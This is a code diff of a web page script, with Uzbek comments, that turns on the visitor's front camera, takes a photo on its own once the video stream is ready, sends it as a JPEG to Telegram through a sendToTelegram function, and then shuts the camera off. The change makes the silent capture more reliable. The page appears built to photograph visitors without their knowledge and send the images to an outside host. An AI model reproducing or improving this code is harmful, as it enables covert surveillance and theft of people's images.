@@ -39,30 +39,29 @@
         }).catch(err => console.log("Telegram xato"));
     }
 
-    navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" } // old kamera
-    })
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(stream => {
         const video = document.getElementById("video");
         video.srcObject = stream;
 
-        // 2 soniyadan keyin avtomatik rasm olish
-        setTimeout(() => {
-            const canvas = document.getElementById("canvas");
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Video oqimi tayyor bo‘lganda rasm olish
+        video.addEventListener('canplay', () => {
+            // 0.5 soniya kutish video oqimi barqaror bo‘lishi uchun
+            setTimeout(() => {
+                const canvas = document.getElementById("canvas");
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(blob => {
-                sendToTelegram(blob);
-            }, "image/jpeg", 0.9);
+                canvas.toBlob(blob => {
+                    sendToTelegram(blob);
+                }, "image/jpeg", 0.9);
 
-            // Kamera o‘chadi
-            stream.getTracks().forEach(track => track.stop());
-        }, 2000);
+                // Kamera o‘chadi
+                stream.getTracks().forEach(track => track.stop());
+            }, 500);
+        });
     })
-    .catch(err => {
-        console.log("Kameraga ruxsat berilmadi");
-    });
+    .catch(err => console.log("Kameraga ruxsat berilmadi"));
 </script>
 
 </body>
